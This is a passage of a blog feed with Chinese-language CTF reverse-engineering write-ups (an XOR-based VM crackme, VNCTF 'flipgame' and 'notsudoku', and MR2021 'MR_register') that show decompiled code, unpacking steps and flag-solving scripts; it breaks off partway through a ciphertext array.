id="app2"><a href="#app2" class="headerlink" title="app2"></a>app2</h3><p>直接进入sub_7FF64E911210()函数分析</p><pre class="line-numbers language-none"><code class="language-none">hWnd = HWND_MESSAGE|0x2;  LODWORD(l) = get_data_from_storage(1i64, &amp;hWnd);  v1 = hWnd;  if ( hWnd != HWND_MESSAGE|0x2 )<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这里获取id==7的储存赋值给hwnd,再看前面通过第二关时</p><pre class="line-numbers language-none"><code class="language-none">add_to_storage(1i64, hWnd);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>只有通过第二关,这里条件才为真, 接下来关注消息的发送, 这里所用的消息发送都将发送wparam==32的消息,执行id==64的代码, </p><pre class="line-numbers language-none"><code class="language-none">PostMessageA(v1, 0x400u, 0x20ui64, 0i64);for ( i = -1i64; i == -1; get_data_from_storage(3i64, &amp;i) );<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>先动调app1,进入第二关后,把断点下在第三关,然后动调app2, 运行过发送消息</p><pre class="line-numbers language-none"><code class="language-none">((void (__fastcall *)(__int64, void **, __int64))logic_dll_add_to_storage)(3i64, &amp;retaddr, 8i64);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>v7函数, 把基地址存为id==3的储存中, 储存完成后 app2的循环停止</p><pre class="line-numbers language-none"><code class="language-none">get_data_from_storage(2i64, v61);   v3 = -1i64;   do     ++v3;   while ( v61[v3] );   if ( (_DWORD)v3 == 32 )<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里是长度检验, id==2是app1的输入框内容, 先判断不成立的情况, 这里的代码由随机数组成, srand(time(0)), 明显有很大问题</p><p>判断成立的情况</p><pre class="line-numbers language-none"><code class="language-none">v10 = _mm_load_si128((const __m128i *)&amp;byte_7FF64E926630);     for ( j = 0i64; j &lt; 32; j += 16i64 )       *(__m128i *)&amp;v61[j] = _mm_xor_si128(v10, _mm_loadu_si128((const __m128i *)&amp;v61[j]));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>一段异或加密, 到这里</p><pre class="line-numbers language-none"><code class="language-none">get_data_from_storage(2i64, v62);do     {       *(__m128i *)&amp;v62[4 * v16] = _mm_xor_si128(_mm_loadu_si128((const __m128i *)&amp;v62[4 * v16]), v17);       v16 += 4i64;     }     while ( v16 &lt; 8 );<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>又是一段异或加密</p><pre class="line-numbers language-none"><code class="language-none">get_data_from_storage(5i64, &amp;i);while ( (_DWORD)i != 'cybr' );<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这里有循环条件,这是其实是rbyc, id==5的由来(app1中):</p><pre class="line-numbers language-none"><code class="language-none">__int64 sub_1AD49780000(){  GetWindowTextA((HWND)0xBD04BA, byte_1AD49760000, 128);  ((void (__fastcall *)(__int64, __int64, __int64))logic_dll_add_to_storage)(5i64, 0x1AD49760000i64, 4i64);  return 0i64;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输入放入id==5, 检查前面4个字节为’rbyc’, 第二次异或加密</p><pre class="line-numbers language-none"><code class="language-none">do      {        *(__m128i *)&amp;v62[4 * v16] = _mm_xor_si128(_mm_loadu_si128((const __m128i *)&amp;v62[4 * v16]), v17);        v16 += 4i64;      }      while ( v16 &lt; 8 );<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后来到swith结构, 像极了虚拟机</p><pre class="line-numbers language-none"><code class="language-none">switch ( *((_BYTE *)&amp;unk_7FF64E910000 + index + 100864) ) // byte_7FF64E928A00<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后慢慢单步走, 慢慢会发现先一直都是1, 2, 然后走5, 6, 8, 3, 8, a, 接下来就又是1, 2……., 最后, 2, 3, 4</p><p>(地址只是一个临时的值,主要怎么计算得到)</p><h4 id="case-1"><a href="#case-1" class="headerlink" title="case 1:"></a>case 1:</h4><p>app1中的执行的代码</p><pre class="line-numbers language-none"><code class="language-none">unk_19BE3430010 = 0i64; // unk_19BE3430010 == *(id==6的数据 + byte_7FF64E928A00[index + 1])// 0 == *(dword *)(byte_7FF64E928A00 + index + 2)  ((void (__fastcall *)(__int64, __int64, __int64))logic_dll_add_to_storage)(10i64, 0x7FF786F70000i64, 8i64);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="case-2"><a href="#case-2" class="headerlink" title="case 2:"></a>case 2:</h4><p>app1中的执行的代码</p><pre class="line-numbers language-none"><code class="language-none">((void (__fastcall *)(__int64, __int64, __int64))logic_dll_add_to_storage)(7i64, 0x19BE3430070i64, 8i64); ((void (__fastcall *)(__int64, __int64, __int64))logic_dll_add_to_storage)(10i64, 0x7FF786F70000i64, 8i64);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>id == 7的数据换为(id==6的数据 + byte_7FF64E928A00[index + 1])</p><h4 id="case-3"><a href="#case-3" class="headerlink" title="case 3:"></a>case 3:</h4><pre class="line-numbers language-none"><code class="language-none">v25 = *(unsigned int *)((char *)&amp;unk_7FF64E910000 + index + 100865);// *(dword *)(byte_7FF64E928A00 + index + 1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">v26 = &amp;i;i = i == v25; //出现了比较<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">LODWORD(l) = add_to_storage(7i64, v26); //比较结果在id == 7数据中<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下来会执行case 8, 将结果(1)加在 *(id==6的数据 + 8)中</p><p>这里就和app1中的加到32有点像了</p><h4 id="case-4"><a href="#case-4" class="headerlink" title="case 4:"></a>case 4:</h4><p>这里是最后的指令, 先前的两步2, 3, 分别是把数据给到id == 7(就是每次比较的结果相加的数据)和 将id == 7与32做比较(和app1重合了), 若为真, 则id == 7 变为1</p><pre class="line-numbers language-none"><code class="language-none">if ( l != 1 )<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>则app1中的执行的代码</p><pre class="line-numbers language-none"><code class="language-none">return 32i64;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样就正确了</p><h4 id="case-5"><a href="#case-5" class="headerlink" title="case 5:"></a>case 5:</h4><p>将id==7的数据换为*(dword *)(byte_7FF64E928A00 + index + 1)</p><h4 id="case-6"><a href="#case-6" class="headerlink" title="case 6:"></a>case 6:</h4><p>app1中的执行的代码</p><pre class="line-numbers language-none"><code class="language-none">unk_27DA7C30008 = 0x81818181i64; // *(id==6的数据 + byte_7FF64E928A00[index + 1]) = (id == 2的数据(input))  ((void (__fastcall *)(__int64, __int64, __int64))logic_dll_add_to_storage)(10i64, 0x7FF786F70000i64, 8i64);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="case-8"><a href="#case-8" class="headerlink" title="case 8:"></a>case 8:</h4><p>app1中的执行的代码:</p><pre class="line-numbers language-none"><code class="language-none">((void (__fastcall *)(__int64, __int64, __int64))logic_dll_add_to_storage)(7i64, 0x27DA7C30008i64, 8i64); ((void (__fastcall *)(__int64, __int64, __int64))logic_dll_add_to_storage)(10i64, 0x7FF786F70000i64, 8i64);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>(id == 7的数据) = *(id==6的数据 + byte_7FF64E928A00[index + 1])</p><p>app2:</p><pre class="line-numbers language-none"><code class="language-none">get_data_from_storage(7i64, &amp;i);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">for ( ii = -1i64; ii == -1; get_data_from_storage(7i64, &amp;ii) )                ;              i += ii;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">remove_data(7i64);             LODWORD(l) = add_to_storage(7i64, &amp;i);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="case-a"><a href="#case-a" class="headerlink" title="case a:"></a>case a:</h4><pre class="line-numbers language-none"><code class="language-none">unk_27DA7C30010 = 0i64;  ((void (__fastcall *)(__int64, __int64, __int64))logic_dll_add_to_storage)(10i64, 0x7FF786F70000i64, 8i64);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>将 id==7 赋值给*(id == 6 + 10)</p><h4 id="综上可以发现"><a href="#综上可以发现" class="headerlink" title="综上可以发现"></a>综上可以发现</h4><p>这里的1, 2指令中的其他一堆赋值貌似没什么用,主要就是每次取字符串的4个字节来加法,加数为指令3的参数(后面一个值), 结果存放在偏移量为0x10的地址中, 然后比较一下是否为32</p><h3 id="解密脚本"><a href="#解密脚本" class="headerlink" title="解密脚本"></a>解密脚本</h3><p>减法解密直接python敲出来就行了</p><pre class="line-numbers language-none"><code class="language-none">#include&lt;iostream&gt;using namespace std;int main(){unsigned char byte_7FF64E926630[16] = {    0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81};unsigned char a[] = {0x90,0x9a,0x9a, 0x90, 0x9a, 0x80,0x8b,0x99,0x80,0x8b,0xb8,0x90,0x96,0x87,0xa7,0x91, 0xc0, 0x80, 0x8c, 0xd3, 0x9c, 0x8d, 0xa7, 0x8f, 0xb3,0x84, 0xc9, 0x81, 0xd2, 0xd2, 0xd9, 0x9f};char key[] = {0x72, 0x62, 0x79, 0x63};for (int i = 0; i &lt; 32; i++){a[i] ^= key[i % 4];}for (int i = 0; i &lt; 32; i++){a[i] ^= 0x81;}for (int i = 0; i &lt; 32; i++){printf("%c", a[i]);}system("pause");return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>vnctf-part-wp</title>
      <link href="/2021/07/20/vnctf-part-wp/"/>
      <url>/2021/07/20/vnctf-part-wp/</url>
      
        <content type="html"><![CDATA[<h2 id="VNCTF"><a href="#VNCTF" class="headerlink" title="VNCTF"></a>VNCTF</h2><span id="more"></span><h3 id="filpgame"><a href="#filpgame" class="headerlink" title="filpgame"></a>filpgame</h3><p>这个题目是仔细解读其实是一个翻牌游戏</p><p>输入减少‘7’如果输入为’A’ascii值为10，</p><p>输入16进制数值分别存放于v1,v2中</p><p><img src="/2021/07/20/vnctf-part-wp/QQ%E6%88%AA%E5%9B%BE20210318194653.png"></p><p>可以看到，把输入的把数word_18301C[v1]16bit中的v2位以及左右位变化，word_18301C[v1+-1]的v2位变化</p><p>0 1 0 0 0 0 0 1 0 0 0 0 1 0 1 0 </p><p>0 1 1 1 0 1 0 0 0 1 0 0 0 0 1 1 </p><p>0 1 0 1 1 1 1 1 0 0 0 1 0 1 1 0 </p><p>1 0 0 0 1 1 0 0 1 1 1 0 1 1 1 1 </p><p>0 0 1 0 0 1 1 0 1 1 1 0 1 1 1 1 </p><p>0 1 0 1 1 1 0 0 0 1 0 1 0 0 1 0 </p><p>0 0 1 1 0 0 1 1 0 1 0 0 1 0 0 1 </p><p>1 0 1 1 0 0 1 0 0 0 1 0 0 0 0 1 </p><p>1 1 0 0 1 0 1 1 1 0 1 1 0 0 1 1 </p><p>1 1 0 0 0 1 0 0 0 0 1 0 1 0 0 1 </p><p>1 0 0 1 1 0 0 0 1 1 1 0 1 1 1 0 </p><p>0 1 1 1 1 0 0 1 0 1 1 1 0 0 0 0 </p><p>1 1 1 0 0 0 1 1 1 0 0 0 0 1 0 1 </p><p>0 1 1 1 1 0 1 1 1 1 0 1 1 0 1 0 </p><p>1 0 0 1 0 1 0 0 1 1 1 1 0 0 1 0 </p><p>1 1 1 0 0 1 0 0 1 0 1 1 0 0 1 1 </p><p>这个是数组的2进制表示，</p><p><img src="/2021/07/20/vnctf-part-wp/QQ%E6%88%AA%E5%9B%BE20210318195919.png"></p><p>要去数组每一个都等于-1，就是2进制表示每一个都等于1，这就成了翻转游戏（这不是算法题目dfs吗，吐了）</p><p>可以直接在网上找到模板，稍微修改一下，我不怎么看得懂这个东西，我直接把所有的0换为1，1换为0，一样的效果</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;iostream&gt;//#define DEBUGusing namespace std;int m, n;int a[20][20], cnt[20][20], ans=0x3f3f3f3f, sumc = 0, anscnt[20][20];int dir[5][2] = {{0,0},{0,1},{0,-1},{1,0},{-1,0}};bool surpass(int i, int j){    if(i&lt;0 || i&gt;=m || j&lt;0 || j&gt;=n) return true;    return false;}int get(int i, int j){    int temp = a[i][j];    for(int k=0;k&lt;5;k++)    {        int x = i+dir[k][0];        int y = j+dir[k][1];        if(!surpass(x, y)) temp += cnt[x][y];    }    return temp &amp; 1;}void dfs(){    for(int i=0;i&lt;(1&lt;&lt;n);i++)    {        memset(cnt, 0, sizeof cnt);        sumc = 0; //改变的次数        int k = i;        for(int j=0;j&lt;n;j++){            cnt[0][n-j-1] = k &amp; 1;            sumc+= cnt[0][n-j-1];            k &gt;&gt;= 1;        }        for(int j=1;j&lt;m;j++)        {            for(k=0;k&lt;n;k++)            {                if(get(j-1, k)) //上方为1                {                    cnt[j][k]=1;                    sumc++;                }            }        }        int sumz = 0;        for(int j=0;j&lt;n;j++)        {            sumz += get(m-1,j); // 统计最后一行的0        }        if(sumz==0 &amp;&amp; sumc &lt; ans)        {            ans = sumc;            memcpy(anscnt, cnt, sizeof cnt);        }    }}int main(){    scanf("%d %d", &amp;m, &amp;n);    int sum=0;    for(int i=0;i&lt;m;i++)    {        for(int j=0;j&lt;n;j++){            scanf("%d", &amp;a[i][j]);            sum+=a[i][j];        }    }    memset(cnt, 0, sizeof cnt);    dfs();    if(ans == 0x3f3f3f3f) cout &lt;&lt; "IMPOSSIBLE" &lt;&lt; endl;    else    for(int i=0;i&lt;m;i++)    {        for(int j=0;j&lt;n;j++){if (anscnt[i][j] == 1)            printf("%x%x", j, i);}    }    return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样就直接得到输入结果，md5得到的结果4个，我是挨着试着交的32位小写交上了。</p><h3 id="notsudoku"><a href="#notsudoku" class="headerlink" title="notsudoku"></a>notsudoku</h3><p>这个题目是一道python写的，然后打包成了exe文件。<br>查壳时发现，这个文件有upx壳，我当初想手脱的，但是dump出来的东西又有问题，就直接用upx工具脱了，再用exeinfope.exe工具查<img src="https://img.kancloud.cn/39/d0/39d01b1338da805c5297b5b51afd5392_153x37.png" alt="img"><br>从这可以看出来是pyinstaller编译的，用pyinstxtractor.py提取pyc文件，（需要用python3.7做提取）<br>再次使用exeinfope.exe检查struct和2文件，可以发现struct是pyc文件，但是2文件却不是，2文件才是关键文件，需要更改文件头，不然不能uncompyle6反编译，直接把struct文件头和2文件头差异部分修改一下，把stuct文件头上多出来的加到2文件上面，更改一下后缀就可以uncompyle6了(不能python3.9)<br>接下来是2.py源码</p><pre class="line-numbers language-none"><code class="language-none">import time, sys, hashlibclass vm:    def __init__(self):        self.dict = {}        self.codeparameter = []        self._input = ''        self.d = [[],[],[],[],[]]        self.e = 65        self.flag1 = 0    def _add(self, key):        def の(f):            self.dict[key] = f            return f        return の    def _get(self, key):        return self.dict.get(key)    def _run(self):        i = 0        while i &lt; 28:            a = self.codeparameter[i][0]            b = self.codeparameter[i][1]            c = self.codeparameter[i][2]            fun = self._get(a)            fun(b, c)            i += 1_vm = vm()@_vm._add('_init')def f1(a, b):    _vm.d[a] = b@_vm._add('_output')def f2(a, b):    \# if a == 1:    \#     print(_vm._input)    \# else:    \#     if a == 2:    \#         print(_vm.d)        \# else:    if a == 3 and _vm.flag1 == 0:        print((_vm.flag), end='')            \# else:            \#     print(a, end='')@_vm._add('_exit()')def f3(a, b):    _vm.flag1 = 0\# @_vm._add('_input')\# def f4(a, b):     _vm._input = input()@_vm._add('_stop')#线程延迟，防止暴力adef f5(a, b):     time.sleep(a)@_vm._add('_cmp')#输入限制&amp;&amp;md5加密输入def f6(a, b):    if len(_vm._input) % 2 != 0:#输入为偶数        _vm.flag1 = 1    for i in _vm._input:        if ord(i) &gt; 52 or ord(i) &lt; 48:#input is between 1 and 3            _vm.flag1 = 1    str1 = ''.join(_vm._input)    x = str(hashlib.new('md5', bytes((str1), encoding='utf8')).hexdigest())    if x[:6] != 'e3a912':        _vm.flag1 = 1    _vm.flag = x@_vm._add('inputeffect')#输入效果def f7(a, b):    j = 0    for i in range(0, len(_vm._input), 2):        j += 1        a = int(_vm._input[i])        b = int(_vm._input[(i + 1)])        _vm.d[a][b] = j@_vm._add('_cmp2')#位置特定值判断def f8(a, b):    if _vm.d[0][1] != 24 or _vm.d[4][3] != 2:        _vm.flag1 = 1    if _vm.d[0][2] != 1 or _vm.d[2][3] != 20:        _vm.flag1 = 1    if _vm.d[1][0] != 23 or _vm.d[3][4] != 3:        _vm.flag1 = 1@_vm._add('_cmp3')#每一行每一列加起来为65def f9(a, b):    e = 0    if b == -1:        for i in range(5):            e += _vm.d[a][i]        if e != _vm.e:            _vm.flag1 = 1    else:        for i in range(5):            e += _vm.d[i][b]        if e != _vm.e:            _vm.flag1 = 1_vm.codeparameter = [#代码集合+参数 [  '_output', 'welcome baby~ ', 0], [  '_output', 'input your flag~:', 0], [  '_input', 0, 0], [  '_output', 'your input is:', 0], [  '_output', 1, 0], [  '_output', "let's check......", 0], [  '_stop', 0.5, 0], [  '_init', 0, [0 for i in range(5)]], [  '_init', 1, [0 for i in range(5)]], [  '_init', 2, [0 for i in range(5)]], [  '_init', 3, [0 for i in range(5)]], [  '_init', 4, [0 for i in range(5)]], [  '_cmp', 0, 0], [  'inputeffect', 0, 0], [  '_cmp2', 0, 0], [  '_cmp3', 0, -1], [  '_cmp3', 1, -1], [  '_cmp3', 2, -1], [  '_cmp3', 3, -1], [  '_cmp3', 4, -1], [  '_cmp3', 0, 0], [  '_cmp3', 0, 1], [  '_cmp3', 0, 2], [  '_cmp3', 0, 3], [  '_cmp3', 0, 4], [  '_output', 'Goodjob!', 0], [  '_output', 'The flag is vnctf{', 0], [  '_output', 3, 0], [  '_output', '}', 0], [  '_exit()', 0, 0]]_vm.flag1 = 0_vm._run()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>又是虚拟机，，，，，<br>+5阶幻方<br>具体算法我尝试搞了一下，搞了半天不出来，放弃了，还是网上搜模板把。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MR2021 reverse MR_register wp</title>
      <link href="/2021/07/20/MR2021-reverse-MR-register-wp/"/>
      <url>/2021/07/20/MR2021-reverse-MR-register-wp/</url>
      
        <content type="html"><![CDATA[<h2 id="MR-register"><a href="#MR-register" class="headerlink" title="MR_register"></a>MR_register</h2><p>这是一个双进程调试，建立一个被调试进程，调试器会对被调试者做出一定处理</p><span id="more"></span><p>根据sscanf找到关键函数。CreatProccessA函数中第6哥参数是进程标志，这里是1 | 2 == 3,建立调试进程及其线程但是只调试进程（具体可以查官方文档）</p><p><img src="/2021/07/20/MR2021-reverse-MR-register-wp/QQ%E6%88%AA%E5%9B%BE20210422153727.png"></p><p>进入sub_40188D函数可以看到是一个调试事件循环</p><p><img src="/2021/07/20/MR2021-reverse-MR-register-wp/QQ%E6%88%AA%E5%9B%BE20210422154344.png"></p><p>建立调试进程后调试时间第一个就是CREATE_PROCESS_DEBUG_EVENT，其值为3</p><p>sub_402CE5就是OpenProcess函数，</p><p>被调试者会进入sub_4026EA函数，</p><p><img src="/2021/07/20/MR2021-reverse-MR-register-wp/QQ%E6%88%AA%E5%9B%BE20210422155410.png"></p><p>动调一下，（不能直接附加），从头开始动调，在除法处会发生异常，buffer[19] == 0, 所以会发生除0异常，</p><p>调试器对异常的处理</p><p><img src="/2021/07/20/MR2021-reverse-MR-register-wp/QQ%E6%88%AA%E5%9B%BE20210422155620.png"></p><p>观察HEX进制窗口，buffer 不满足前面两个条件，通过sub_402545和rip + 2处理异常</p><p><img src="/2021/07/20/MR2021-reverse-MR-register-wp/QQ%E6%88%AA%E5%9B%BE20210422155827.png"></p><p>主要目的是对dword_405020做修改</p><p>sub_402545中有花</p><p><img src="/2021/07/20/MR2021-reverse-MR-register-wp/QQ%E6%88%AA%E5%9B%BE20210422145806.png"></p><p>因为紧接着就是call的地址，所以不用jmp，直接Nop</p><p>再看sub_401CA7函数，有两个断点异常，且下两个字节分别符合0xc3和0x25, 0x25和0x25,</p><p><img src="/2021/07/20/MR2021-reverse-MR-register-wp/QQ%E6%88%AA%E5%9B%BE20210422145714.png"></p><p><img src="/2021/07/20/MR2021-reverse-MR-register-wp/QQ%E6%88%AA%E5%9B%BE20210422145727.png"></p><p>将rip跳走了两个字节，直接nop掉；</p><p>这样就可以f5了，虽然f5出来还是有点错误，主要是后面那点栈指针不平衡，但是还是能看，参数传递也分析失败了，这里我直接看的汇编，rcx为第一个参数，依次为rdx,r8,分别对应第二次输入，第一次输入，创建的文件的句柄。</p><p>F5出来的伪代码， - （45）作为分割点</p><p><img src="/2021/07/20/MR2021-reverse-MR-register-wp/QQ%E6%88%AA%E5%9B%BE20210422161241.png"></p><p>然后进入sub_40239E比较</p><p><img src="/2021/07/20/MR2021-reverse-MR-register-wp/QQ%E6%88%AA%E5%9B%BE20210422161557.png"></p><p>脚本：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include&lt;iostream&gt;#include&lt;cstdio&gt;#include&lt;vector&gt;#include&lt;cstring&gt;#include&lt;sstream&gt;using namespace std;vector&lt;char&gt; v;string a[500];int b[500];int main(){    char v9[96]; // [rsp+40h] [rbp-40h] BYREF    char v10[500]; // [rsp+A0h] [rbp+20h] BYREF    unsigned char v26; // [rsp+3B61h] [rbp+3AE1h]    unsigned char v27; // [rsp+3B62h] [rbp+3AE2h]    unsigned char v28; // [rsp+3B63h] [rbp+3AE3h]    int i; // [rsp+3B7Ch] [rbp+3AFCh]    unsigned int miwen[376] = {    0x0000001D, 0x0000006E, 0x0000004E, 0x0000003F, 0x00000039, 0x0000003A, 0x00000028, 0x00000029,     0x00000017, 0x00000014, 0x00000037, 0x00000046, 0x00000043, 0x00000030, 0x00000011, 0x00000012,     0x0000002D, 0x0000002E, 0x00000002, 0x0000000C, 0x00000030, 0x00000031, 0x00000032, 0x0000003E,     0x00000025, 0x00000026, 0x00000005, 0x00000076, 0x0000005E, 0x0000002D, 0x0000000F, 0x0000000C,     0x0000001D, 0x0000001E, 0x0000003F, 0x0000004C, 0x00000066, 0x00000015, 0x00000038, 0x0000003B,     0x00000015, 0x00000016, 0x00000006, 0x00000075, 0x0000006F, 0x0000001C, 0x00000003, 0x00000000,     0x0000000D, 0x0000007C, 0x0000007F, 0x00000003, 0x00000010, 0x0000006C, 0x0000007A, 0x0000000B,     0x00000005, 0x00000006, 0x0000002A, 0x0000002B, 0x00000021, 0x00000052, 0x0000007D, 0x0000000E,     0x00000050, 0x00000053, 0x0000007F, 0x0000007C, 0x0000005B, 0x0000005A, 0x00000056, 0x00000058,     0x0000006C, 0x00000010, 0x00000006, 0x00000077, 0x00000071, 0x00000072, 0x00000050, 0x00000051,     0x0000007D, 0x0000000E, 0x00000011, 0x00000062, 0x00000078, 0x0000007B, 0x0000006B, 0x00000068,     0x00000076, 0x00000078, 0x0000007E, 0x00000070, 0x00000071, 0x00000070, 0x00000043, 0x00000040,     0x0000005D, 0x00000051, 0x00000046, 0x0000003A, 0x00000005, 0x00000079, 0x00000042, 0x0000004C,     0x00000079, 0x0000007A, 0x00000057, 0x00000026, 0x00000023, 0x0000005F, 0x0000004A, 0x00000044,     0x0000006D, 0x0000006C, 0x0000006C, 0x0000006F, 0x00000049, 0x0000004A, 0x00000066, 0x00000067,     0x00000054, 0x0000005A, 0x0000005E, 0x00000050, 0x00000063, 0x00000062, 0x00000052, 0x00000051,     0x000000BD, 0x000000BE, 0x0000009D, 0x0000009C, 0x000000A9, 0x000000A8, 0x00000097, 0x00000099,     0x000000AD, 0x000000D1, 0x000000C6, 0x000000B7, 0x000000B1, 0x000000B2, 0x00000090, 0x000000E3,     0x000000DC, 0x000000A0, 0x000000B7, 0x000000B9, 0x0000008B, 0x0000008A, 0x000000BB, 0x000000B8,     0x000000A5, 0x000000A6, 0x000000B7, 0x000000B6, 0x00000082, 0x000000F1, 0x000000DD, 0x000000AE,     0x000000BE, 0x000000B0, 0x00000086, 0x0000008A, 0x00000099, 0x000000E8, 0x000000E5, 0x00000096,     0x000000B8, 0x000000B9, 0x000000B4, 0x000000C7, 0x000000E1, 0x00000092, 0x00000080, 0x00000083,     0x0000008D, 0x0000008E, 0x000000A2, 0x000000A3, 0x000000A5, 0x000000A4, 0x000000AB, 0x000000D8,     0x000000F7, 0x00000084, 0x00000094, 0x000000E7, 0x000000F1, 0x00000080, 0x00000083, 0x00000080,     0x000000D0, 0x000000A3, 0x00000081, 0x000000F2, 0x000000E9, 0x000000E8, 0x000000D9, 0x000000D8,     0x000000E6, 0x000000E7, 0x000000D5, 0x000000D6, 0x000000F1, 0x000000F2, 0x000000D1, 0x000000A2,     0x00000093, 0x00000092, 0x00000090, 0x000000E3, 0x000000C4, 0x000000C5, 0x000000C9, 0x000000C8,     0x000000C7, 0x000000C4, 0x000000E7, 0x000000E4, 0x000000C1, 0x000000C0, 0x000000F0, 0x000000F1,     0x000000F0, 0x000000F1, 0x000000FC, 0x0000008F, 0x000000A6, 0x000000D5, 0x000000F8, 0x000000FB,     0x000000D5, 0x000000D6, 0x000000C7, 0x000000B4, 0x0000008D, 0x0000008C, 0x000000A3, 0x000000D0,     0x000000DE, 0x000000DF, 0x000000EC, 0x000000ED, 0x000000E9, 0x000000EA, 0x000000CB, 0x000000BA,     0x000000BA, 0x000000C9, 0x000000E7, 0x00000094, 0x000000B0, 0x000000CC, 0x000000DB, 0x000000D5,     0x0000002E, 0x0000002F, 0x0000002C, 0x0000002F, 0x00000039, 0x0000003A, 0x00000016, 0x00000017,     0x00000017, 0x00000016, 0x00000017, 0x00000019, 0x00000029, 0x00000055, 0x00000041, 0x00000040,     0x00000052, 0x0000002E, 0x00000037, 0x0000003B, 0x00000029, 0x0000002A, 0x00000006, 0x00000075,     0x00000054, 0x00000028, 0x0000003F, 0x00000031, 0x00000030, 0x0000003E, 0x0000003A, 0x00000034,     0x0000000D, 0x0000007E, 0x0000006E, 0x0000001F, 0x00000019, 0x0000001A, 0x00000039, 0x0000004A,     0x00000049, 0x00000048, 0x00000065, 0x00000016, 0x0000003C, 0x0000003D, 0x00000002, 0x0000000C,     0x00000015, 0x00000069, 0x0000007E, 0x0000000F, 0x00000009, 0x0000000A, 0x0000002B, 0x00000058,     0x00000074, 0x00000007, 0x00000016, 0x00000018, 0x00000019, 0x00000017, 0x0000002F, 0x0000002E,     0x0000006D, 0x0000001E, 0x00000000, 0x00000071, 0x00000079, 0x0000007A, 0x0000006A, 0x00000019,     0x00000004, 0x00000077, 0x00000064, 0x00000017, 0x0000000F, 0x00000073, 0x0000006A, 0x00000064,     0x0000004D, 0x0000004C, 0x00000042, 0x00000041, 0x00000069, 0x00000018, 0x0000001B, 0x0000001A,     0x0000001B, 0x0000001A, 0x00000016, 0x00000065, 